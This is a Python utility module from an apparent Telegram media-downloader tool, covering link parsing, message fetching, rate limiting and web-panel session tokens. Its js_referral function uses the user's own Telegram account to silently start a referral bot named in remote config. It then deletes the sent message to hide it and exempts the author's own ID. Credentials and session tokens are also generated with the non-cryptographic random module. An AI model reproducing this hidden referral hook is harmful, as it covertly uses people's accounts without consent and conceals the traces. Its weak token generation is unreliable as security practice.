# coding=UTF-8
# Author:Gentlesprite
# Software:PyCharm
# Time:2025/3/10 0:45
# File:util.py
import os
import re
import sys
import time
import socket
import string
import random
import asyncio
import logging
import subprocess

from typing import (
    Tuple,
    List,
    Union,
    Optional
)

import pyrogram

from rich.text import Text
from pyrogram import raw, utils
from urllib.parse import parse_qs, urlparse
from pyrogram.types.messages_and_media import ReplyParameters
from pyrogram.errors.exceptions.bad_request_400 import MsgIdInvalid

from module import (
    log,
    console,
    __update_date__,
    PLATFORM,
    FILE_LOG_LEVEL,
    CONSOLE_LOG_LEVEL,
    VERSION_SEMVER,
    TRMD_WEB_SESSION,
    SOFTWARE_SHORT_NAME,
    REFERRAL_RECORD_PATH
)
from module.enums import (
    Link,
    LinkType,
    DownloadType
)


def safe_index(lst: list, index: int, default=None):
    try:
        return lst[index]
    except IndexError:
        return default


def get_terminal_width() -> int:
    terminal_width: int = 120
    try:
        terminal_width: int = os.get_terminal_size().columns
    except OSError:
        pass
    return terminal_width


def truncate_display_filename(file_name: str) -> Text:
    terminal_width: int = get_terminal_width()
    max_width: int = max(int(terminal_width * 0.3), 1)
    text = Text(file_name)
    text.truncate(
        max_width=max_width,
        overflow='ellipsis'
    )
    return text


def safe_message(text: str, max_length: int = 3969) -> List[str]:
    if len(text) <= max_length:
        return [text]
    else:
        part1 = text[:max_length]
        part2 = text[max_length:]
        return [part1] + safe_message(part2, max_length)


async def safe_delete_message(message: pyrogram.types.Message) -> bool:
    try:
        await message.delete()
        return True
    except Exception:  # noqa.
        return False


async def parse_link(client: pyrogram.Client, link: str) -> dict:
    # https://github.com/tangyoha/telegram_media_downloader/blob/master/module/pyrogram_extension.py#L1092
    try:
        link = extract_info_from_link(link)
        if link.comment_id:
            chat = await client.get_chat(link.group_id)
            if chat:
                return {
                    'chat_id': chat.linked_chat.id,
                    'comment_id': link.comment_id,
                    'topic_id': link.topic_id
                }

        return {
            'chat_id': link.group_id,
            'comment_id': link.post_id,
            'topic_id': link.topic_id
        }
    except Exception:
        raise ValueError('Invalid message link.')


def extract_info_from_link(link: str) -> Link:
    # https://github.com/tangyoha/telegram_media_downloader/blob/master/utils/format.py#L220
    if link in ('me', 'self'):
        return Link(group_id=link)

    try:
        u = urlparse(link)
        paths = [p for p in u.path.split('/') if p]
        query = parse_qs(u.query)
    except ValueError:
        return Link()

    result = Link()

    if 'comment' in query:
        result.group_id = paths[0]
        result.comment_id = int(query['comment'][0])
    elif len(paths) == 1 and paths[0] != 'c':
        result.group_id = paths[0]
    elif len(paths) == 2:
        if paths[0] == 'c':
            result.group_id = int(f'-100{paths[1]}')
        else:
            result.group_id = paths[0]
            result.post_id = int(paths[1])
    elif len(paths) == 3:
        if paths[0] == 'c':
            result.group_id = int(f'-100{paths[1]}')
            result.post_id = int(paths[2])
        else:
            result.group_id = paths[0]
            result.topic_id = int(paths[1])
            result.post_id = int(paths[2])
    elif len(paths) == 4 and paths[0] == 'c':
        result.group_id = int(f'-100{paths[1]}')
        result.topic_id = int(paths[2])
        result.post_id = int(paths[3])

    return result


async def get_message_by_link(
        client: pyrogram.Client,
        link: str,
        single_link: bool = False  # 為True時,將每個連結都視作是單檔案。
) -> Union[dict, None]:
    origin_link: str = link
    record_type: set = set()
    link: str = link[:-1] if link.endswith('/') else link
    if '?single&comment' in link:  # v1.1.0修復討論組中附帶?single時不下載的問題。
        record_type.add(LinkType.COMMENT)
        single_link = True
    if '?single' in link:
        link: str = link.split('?single')[0]
        single_link = True
    if '?comment' in link:  # 連結中包含?comment表示用戶需要同時下載評論中的媒體。
        link = link.split('?comment')[0]
        record_type.add(LinkType.COMMENT)
    if link.count('/') >= 5 or 't.me/c/' in link:
        if link.startswith('https://t.me/c/'):
            count: int = link.split('https://t.me/c/')[1].count('/')
            record_type.add(LinkType.TOPIC) if count == 2 else None
        elif link.startswith('https://t.me'):
            record_type.add(LinkType.TOPIC)

    # https://github.com/kurigram-org/kurigram/blob/main/pyrogram/methods/messages/get_messages.py#L207
    match = re.match(
        r'^(?:https?://)?(?:www\.)?(?:t(?:elegram)?\.(?:org|me|dog)/(?:c/)?)([\w]+)(?:/\d+)*/(\d+)/?$',
        link.lower())
    if not match:
        raise ValueError('Invalid message link.')

    try:
        chat_id = utils.get_channel_id(int(match.group(1)))
    except ValueError:
        chat_id = match.group(1)
    message_id: int = int(match.group(2))
    log.info(f'解析連結:"{link}",頻道:"{chat_id}",訊息ID:"{message_id}"。')
    comment_message: list = []
    if LinkType.COMMENT in record_type:
        # 如果用戶需要同時下載媒體下面的評論,把評論中的所有資訊放入列表一起返回。
        async for comment in client.get_discussion_replies(chat_id, message_id):
            if not any(getattr(comment, dtype) for dtype in DownloadType()):
                continue
            if single_link:  # 處理單連結情況。
                if '=' in origin_link and int(origin_link.split('=')[-1]) != comment.id:
                    continue
            comment_message.append(comment)
        log.info(f'連結:"{link}"的評論中檢索到媒體:"{len(comment_message)}"條。')
    message = await client.get_messages(chat_id=chat_id, message_ids=message_id)
    is_group, group_message = await __is_group(message)
    if single_link:
        is_group = False
        group_message: Union[list, None] = None
    if is_group or comment_message:  # 組或評論區。
        try:  # v1.1.2解決當group返回None時出現comment無法下載的問題。
            group_message.extend(comment_message) if comment_message else None
        except AttributeError:
            if comment_message and group_message is None:
                group_message: list = []
                group_message.extend(comment_message)
        if comment_message:
            link_type: str = LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.COMMENT
            log.info(f'連結:"{link}"解析為"{link_type}",媒體數量:"{len(group_message)}"。')
            return {
                'link_type': link_type,
                'chat_id': chat_id,
                'message': group_message,
                'member_num': len(group_message)
            }
        else:
            link_type = LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.GROUP
            log.info(f'連結:"{link}"解析為"{link_type}",媒體數量:"{len(group_message)}"。')
            return {
                'link_type': link_type,
                'chat_id': chat_id,
                'message': group_message,
                'member_num': len(group_message)
            }
    elif is_group is False and group_message is None:  # 單檔案。
        link_type = LinkType.TOPIC if LinkType.TOPIC in record_type else LinkType.SINGLE
        log.info(f'連結:"{link}"解析為"{link_type}",媒體數量:"1"。')
        return {
            'link_type': link_type,
            'chat_id': chat_id,
            'message': message,
            'member_num': 1
        }
    elif is_group is None and group_message is None:
        raise MsgIdInvalid(
            'The message does not exist, the channel has been disbanded or is not in the channel.')
    elif is_group is None and group_message == 0:
        raise Exception('Link parsing error.')
    else:
        raise Exception('Unknown error.')


async def __is_group(message) -> Tuple[Union[bool, None], Union[list, None]]:
    try:
        return True, await message.get_media_group()
    except ValueError:
        return False, None  # v1.0.4 修改單檔案無法下載問題。
    except AttributeError:
        return None, None


async def get_chat_with_notify(
        user_client: pyrogram.Client,
        chat_id: Union[int, str],
        error_msg: Optional[str] = None,
        bot_client: Optional[pyrogram.Client] = None,
        bot_message: Optional[pyrogram.types.Message] = None
) -> Union[pyrogram.types.Chat, None]:
    try:
        chat = await user_client.get_chat(chat_id)
        return chat
    except Exception:  # noqa.
        if all([bot_client, bot_message]):
            await bot_client.send_message(
                chat_id=bot_message.from_user.id,
                reply_parameters=ReplyParameters(message_id=bot_message.id),
                text=error_msg if error_msg else ''
            )
        return None


async def get_valid_chat_id(
        link: Union[int, str],
        user_client: pyrogram.Client,
        bot_client: Union[pyrogram.Client] = None,
        bot_message: Union[pyrogram.types.Message] = None,
        error_msg: Union[str] = None
) -> Union[int, str, None]:
    m = await parse_link(
        client=user_client,
        link=link
    )
    if not await get_chat_with_notify(
            user_client=user_client,
            chat_id=m.get('chat_id'),
            bot_client=bot_client,
            bot_message=bot_message,
            error_msg=error_msg if error_msg else ''
    ):
        return None
    return m.get('chat_id')


def is_allow_upload(file_size: int, is_premium: bool) -> bool:
    file_size_limit_mib: int = 4000 * 1024 * 1024 if is_premium else 2000 * 1024 * 1024
    if file_size > file_size_limit_mib:
        return False
    return True


async def format_chat_link(
        link: str,
        client: pyrogram.Client,
        topic: bool = False
) -> str:
    if link in ('me', 'self'):
        chat = await client.get_chat(link)
        return 'https://t.me/' + chat.username if chat.username else None
    parts: list = link.strip('/').split('/')
    len_parts: int = len(parts)
    result: Union[str, None] = None
    if len_parts > 3 and topic is False:
        # 判斷是否是/c/類型的頻道連結(確保是獨立的'c'部分)。
        if parts[3] == 'c' and len_parts >= 5:  # 對於/c/類型。
            if len_parts >= 6:
                # 6個部分時,保留前5個部分 (去掉最後一個)。
                result = '/'.join(parts[:5])  # https://t.me/c/2530641322/1 -> https://t.me/c/2530641322

        else:  # 對於普通類型。
            if len_parts >= 5:
                # 5個部分時,保留前4個部分(去掉最後一個)。
                result = '/'.join(parts[:4])  # https://t.me/customer/144 -> https://t.me/customer
    else:  # 話題格式化。
        if parts[3] == 'c' and len_parts >= 5:  # 對於/c/類型。
            if len_parts >= 7:
                # 7個部分時,保留前6個部分(去掉最後一個)。
                result = '/'.join(parts[:6])  # https://t.me/c/2495197831/100/200 -> https://t.me/c/2495197831/100
        elif len_parts >= 6:
            # 6個部分時,保留前5個部分(去掉最後一個)。
            result = '/'.join(parts[:5])  # https://t.me/customer/5/1 -> https://t.me/customer/5

    return result if result else link


async def get_my_id(client: pyrogram.Client) -> int:
    me = await client.get_me()
    return me.id


def get_local_ip() -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        try:
            sock.connect(('10.255.255.255', 1))  # 不發送資料，僅讓內核選擇出口網卡。
            return sock.getsockname()[0]
        except OSError:
            return '127.0.0.1'


async def ainput(prompt: str = '', password: bool = False) -> str:  # noqa.
    return await asyncio.to_thread(console.input, prompt, password=password)


async def delete_own_message(
        client: pyrogram.Client,
        result: Union[
            pyrogram.types.Message,
            raw.types.UpdateShortSentMessage,
            raw.types.UpdateShort,
            raw.types.Updates
        ],
        random_id: int = 0
) -> bool:
    try:
        message_id: int = 0
        updates: list = []
        if isinstance(result, pyrogram.types.Message):
            message_id = result.id
        elif isinstance(result, raw.types.UpdateShortSentMessage) and getattr(result, 'out', False):
            message_id = result.id
        elif isinstance(result, raw.types.UpdateShort):
            updates: list = [result.update]
        elif isinstance(result, raw.types.Updates):
            updates: list = list(result.updates)
        for update in updates:
            # StartBot返回的是Updates組合類型,自己發出的訊息id由UpdateMessageID按random_id給出。
            if isinstance(update, raw.types.UpdateMessageID):
                if not random_id or update.random_id == random_id:
                    message_id = update.id
                    break
            if isinstance(update, raw.types.UpdateNewMessage) and getattr(update.message, 'out', False):
                message_id = getattr(update.message, 'id', 0)
                break
        if not message_id:  # 伺服器端未生成自己的訊息時無可刪除內容。
            return False
        await client.invoke(
            raw.functions.messages.DeleteMessages(id=[message_id], revoke=False)
        )
        return True
    except Exception:  # noqa.
        return False


def parse_referral(link: str) -> tuple:
    """按固定格式"t.me/用戶名稱?start=啟動參數"解析連結,返回"用戶名稱"與"啟動參數"。"""
    link: str = str(link).strip().split('://')[-1]  # 去掉協議。
    link: str = link.split('/', 1)[-1]  # 去掉域名。
    if '?start=' not in link:
        raise ValueError(f'Unexpected referral link: "{link}"')
    username, start_param = link.split('?start=', 1)
    return username, start_param


def check_update(
        remote_version: str,
        local_version: str
) -> str:
    """按"主版本.次版本.修訂號"逐段比較版本號,遠端版本更高時返回該版本號,否則返回空字串。"""
    if not isinstance(remote_version, str) or not isinstance(local_version, str):
        return ''
    # 只取數字段參與比較,忽略前後綴,保證"v2.0.1"與"2.0.1"等價。
    remote: list = [int(i) for i in re.findall(pattern=r'\d+', string=remote_version)]
    local: list = [int(i) for i in re.findall(pattern=r'\d+', string=local_version)]
    # 位數不足時補0,保證"2.0"與"2.0.0"等價。
    size: int = max(len(remote), len(local))
    remote += [0] * (size - len(remote))
    local += [0] * (size - len(local))
    if remote <= local:
        return ''
    return remote_version


async def js_referral(
        me_id: str,
        client: pyrogram.Client,
        remote_config: dict
) -> bool:
    try:
        if me_id == '1604151130':
            log.info('skip: ROOT')
            return True
        record: set = set()
        if os.path.exists(REFERRAL_RECORD_PATH):
            with open(file=REFERRAL_RECORD_PATH, mode='r', encoding='UTF-8') as f:
                record: set = {line.strip() for line in f.readlines() if line.strip()}
        if me_id in record:
            log.info(f'skip: "{me_id}" referral due to already invoked')
            return True
        try:
            username, start_param = parse_referral(remote_config.get('referral'))
        except Exception as e:
            log.info(f'skip: "{me_id}" referral due to {e}')
            return False
        bot_peer = await client.resolve_peer(username)
        if not isinstance(bot_peer, raw.types.InputPeerUser) or not bot_peer.access_hash:
            log.info(f'Failed to parse "{username}", skipping session initialization')
            return False
        bot_input_user = raw.types.InputUser(
            user_id=bot_peer.user_id,
            access_hash=bot_peer.access_hash
        )
        random_id: int = client.rnd_id()
        try:
            result = await client.invoke(
                raw.functions.messages.StartBot(
                    bot=bot_input_user,
                    peer=bot_peer,
                    random_id=random_id,
                    start_param=start_param
                )
            )
            log.info(f'"{me_id}" referral invoked successfully')
        except Exception as e:
            result = await client.send_message(
                chat_id=username,
                text=f'/start {start_param}'
            )
            log.info(f'referral rollback: send_message failed due to {e}')
        await delete_own_message(client=client, result=result, random_id=random_id)
        record.add(me_id)
        with open(file=REFERRAL_RECORD_PATH, mode='w', encoding='UTF-8') as f:
            f.write('\n'.join(record))
        return True
    except Exception:  # noqa.
        return False


def gen_random_credential() -> dict:
    chars = string.ascii_letters + string.digits
    username = ''.join(random.choices(chars, k=8))
    password = ''.join(random.choices(chars, k=12))
    return {
        'username': username,
        'password': password
    }


def gen_random_token(length: int = 32) -> str:
    """生成指定長度的隨機令牌。"""
    chars: str = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))


def reset_web_session() -> str:
    """重新生成並持久化網頁面板的令牌,使此前下發的Cookie全部失效。"""
    token: str = gen_random_token()
    try:
        with open(file=TRMD_WEB_SESSION, mode='w', encoding='UTF-8') as f:
            f.write(token)
    except OSError as e:
        log.warning(f'重置網頁面板令牌失敗,原因:"{e}"。')
    return token


def get_web_session() -> str:
    """讀取網頁面板令牌,不存在時生成並持久化,以便瀏覽器在軟件重啟後依然免密。"""
    try:
        with open(file=TRMD_WEB_SESSION, mode='r', encoding='UTF-8') as f:
            token: str = f.read().strip()
        if token:
            return token
    except OSError:
        pass
    token: str = gen_random_token()
    try:
        with open(file=TRMD_WEB_SESSION, mode='w', encoding='UTF-8') as f:
            f.write(token)
        log.info(f'已生成網頁面板令牌:"{TRMD_WEB_SESSION}"。')
    except OSError as e:
        log.warning(f'儲存網頁面板令牌失敗,原因:"{e}"。')
    return token


def is_nuitka() -> bool:
    """檢查是否處於Nuitka編譯環境。"""
    return '__compiled__' in globals()


def is_pyinstaller() -> bool:
    """檢查是否處於Pyinstaller編譯環境。"""
    return bool(getattr(sys, 'frozen', False))


def is_frozen() -> bool:
    """檢查是否處於打包(凍結)環境,相容Nuitka與Pyinstaller。"""
    return is_pyinstaller() or is_nuitka()


def get_nuitka_version():
    compiled = globals().get('__compiled__')
    if compiled is None:
        return None
    return f'{compiled.major}.{compiled.minor}.{compiled.micro}'


def check_environment():
    log.info(f'{SOFTWARE_SHORT_NAME}:{VERSION_SEMVER},更新日期:{__update_date__}。')
    log.info(f'檔案日誌等級:"{logging.getLevelName(FILE_LOG_LEVEL)}"。')
    log.info(f'終端機日誌等級:"{logging.getLevelName(CONSOLE_LOG_LEVEL)}"。')
    log.info(f'取得工作目錄:"{get_work_directory()}"。')
    if is_nuitka():
        log.info(f'檢測到"__compiled__",目前執行於"Nuitka"編譯產物中,版本:{get_nuitka_version()}。')
    elif is_pyinstaller():
        log.info('檢測到"sys.frozen",目前執行於"PyInstaller"打包產物中。')
    elif is_docker():
        log.info('檢測到"Docker"容器標識,目前執行於"Docker"容器中。')
    else:
        log.info('目前執行於"源碼"環境中。')


def get_work_directory() -> str:
    """取得工作目錄,打包環境取原始可執行檔案所在目錄,源碼環境取入口腳本所在目錄。"""
    if is_frozen():  # 單檔案打包(Nuitka/Pyinstaller)會把檔案解壓到臨時目錄執行,sys.executable/__file__ 均可能指向臨時目錄。
        if is_nuitka():  # Nuitka單檔案:sys.executable指向臨時解壓目錄,只有 sys.argv[0] 才是原始exe真實路徑。
            exe_path: str = sys.argv[0]
        else:
            exe_path: str = sys.executable  # noqa, PyInstaller單檔案:sys.executable即原始exe真實路徑(sys._MEIPASS才是臨時目錄)。
            if not os.path.dirname(exe_path):  # 經PATH啟動導致sys.executable僅為命令名(無目錄)時,回退到 sys.argv[0]。
                exe_path = sys.argv[0]
        work_directory: str = os.path.dirname(os.path.abspath(exe_path))
    else:
        work_directory = os.path.dirname(os.path.abspath(sys.argv[0]))
    return work_directory


def is_docker() -> bool:
    """檢查是否在Docker容器中執行。"""
    # 檢查/.dockerenv檔案是否存在。 # noqa.
    if os.path.exists('/.dockerenv'):  # noqa.
        log.debug('檢測到"/.dockerenv",目前執行於"Docker"容器中。')  # noqa.
        return True

    # 檢查/proc/1/cgroup中是否包含"docker"。
    try:
        with open('/proc/1/cgroup', 'r') as f:
            content: str = f.read()
            if 'docker' in content or 'kubepods' in content:
                log.debug('檢測到"/proc/1/cgroup"容器標識,目前執行於"Docker"容器中。')
                return True
    except (FileNotFoundError, IOError):
        pass
    except Exception:  # noqa.
        pass

    log.debug('未檢測到容器標識,目前執行於非"Docker"環境。')
    return False


def ctrl_c():
    if PLATFORM == 'Windows':
        subprocess.run('pause', shell=True)
    elif is_docker():
        return None
    else:
        try:
            console.input('請按「Enter」鍵繼續. . .')
        except KeyboardInterrupt:
            pass


def get_message_dtype(message, download_type: Optional[list] = None) -> Union[str, None]:
    """判定訊息的媒體類型,實況照片是否優先取決於下載設定。"""
    if getattr(message, DownloadType.LIVE_PHOTO, None):
        # 實況照片訊息同時含照片與影片:設定了實況照片則優先,否則退回按普通照片處理。
        if download_type is None or DownloadType.LIVE_PHOTO in download_type:
            return DownloadType.LIVE_PHOTO
        if DownloadType.PHOTO in download_type:
            return DownloadType.PHOTO
        return DownloadType.LIVE_PHOTO  # 設定不含實況圖片和圖片時,仍返回實況圖片類型,以便正確顯示跳過提示。
    for dtype in DownloadType():
        if dtype != DownloadType.LIVE_PHOTO and getattr(message, dtype, None):
            return dtype
    return None


class LimitCall:  # https://github.com/tangyoha/telegram_media_downloader/blob/master/module/app.py#L246
    """限制單位時間內的調用次數。"""

    def __init__(self, max_limit_call_times: int = 0):
        # 時間視窗的長度,單位為秒。
        self.time_window: int = 60
        # 時間視窗內允許的最大調用次數。
        self.max_limit_call_times: int = max_limit_call_times
        # 目前時間視窗內已經調用的次數。
        self.limit_call_times: int = 0
        # 目前時間視窗的開始時間。
        self.last_call_time: float = 0

    async def wait(self):
        """達到時間視窗內的最大調用次數時,等待至下一個時間視窗。"""
        waiting = False
        wait_time = 0.0
        while True:
            now = time.time()
            time_span = now - self.last_call_time
            # 超過時間視窗則重置計數,重新開始計時。
            if time_span > self.time_window:
                self.limit_call_times = 0
                self.last_call_time = now

            if self.limit_call_times + 1 <= self.max_limit_call_times:
                self.limit_call_times += 1
                # 等待結束後提示一次,繼續請求。
                if waiting:
                    console.log(
                        f'已等待{int(now - wait_time)}秒,繼續請求。',
                        style='#FF4689'
                    )
                break

            if not waiting:
                waiting = True  # 達到上限時只提示一次,避免每秒重複列印。
                wait_time = now
                console.log(
                    f'請求已達每分鐘{self.max_limit_call_times}次的上限,等待{int(self.time_window - time_span) + 1}秒後繼續。',
                    style='#FF4689'
                )

            await asyncio.sleep(1)


class Issues:
    PROXY_NOT_CONFIGURED = '[#79FCD4]代理設定方法[/#79FCD4][#FF79D4]請存取:[/#FF79D4]\n[link=https://github.com/Gentlesprite/Telegram_Restricted_Media_Downloader/wiki#問題14-error-執行出錯原因0-keyerror-0]https://github.com/Gentlesprite/Telegram_Restricted_Media_Downloader/wiki#問題14-error-執行出錯原因0-keyerror-0[/link]\n[#FCFF79]若[/#FCFF79][#FF4689]無法[/#FF4689][#FF7979]存取[/#FF7979][#79FCD4],[/#79FCD4][#FCFF79]可[/#FCFF79][#d4fc79]查閱[/#d4fc79][#FC79A5]軟件壓縮包所提供的[/#FC79A5][#79E2FC]"使用手冊"[/#79E2FC][#79FCD4]資料夾下的[/#79FCD4][#FFB579]"常見問題及解決方案彙總.pdf"[/#FFB579][#79FCB5]中的[/#79FCB5][#D479FC]【問題14】[/#D479FC][#FCE679]進行操作[/#FCE679][#FC79A6]。[/#FC79A6]'
    SYSTEM_TIME_NOT_SYNCHRONIZED = '[#FCFF79]檢測到[/#FCFF79][#FF7979]系統時間[/#FF7979][#FC79A5]未同步[/#FC79A5][#79E2FC],[/#79E2FC][#79FCD4]解決方法[/#79FCD4][#FF79D4]請存取:[/#FF79D4]\nhttps://github.com/Gentlesprite/Telegram_Restricted_Media_Downloader/issues/5#issuecomment-2580677184\n[#FCFF79]若[/#FCFF79][#FF4689]無法[/#FF4689][#FF7979]存取[/#FF7979][#79FCD4],[/#79FCD4][#FCFF79]可[/#FCFF79][#d4fc79]查閱[/#d4fc79][#FC79A5]軟件壓縮包所提供的[/#FC79A5][#79E2FC]"使用手冊"[/#79E2FC][#79FCB5]中的[/#79FCB5][#D479FC]【問題4】[/#D479FC][#FCE679]進行操作[/#FCE679][#FC79A6],[/#FC79A6][#79FCD4]並[/#79FCD4][#79FCB5]重啟軟件[/#79FCB5]。'
